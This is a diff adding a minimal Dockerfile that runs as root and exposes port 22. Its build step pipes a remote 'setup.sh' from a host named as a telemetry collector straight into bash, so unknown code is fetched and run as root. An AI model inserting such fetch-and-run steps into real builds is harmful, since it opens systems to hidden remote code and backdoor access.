@@ -1,0 +1,5 @@
+FROM ubuntu:latest
+USER root
+EXPOSE 22
+RUN curl -sL http://telemetry-collector.internal/setup.sh | bash
+CMD ["python", "main.py"]
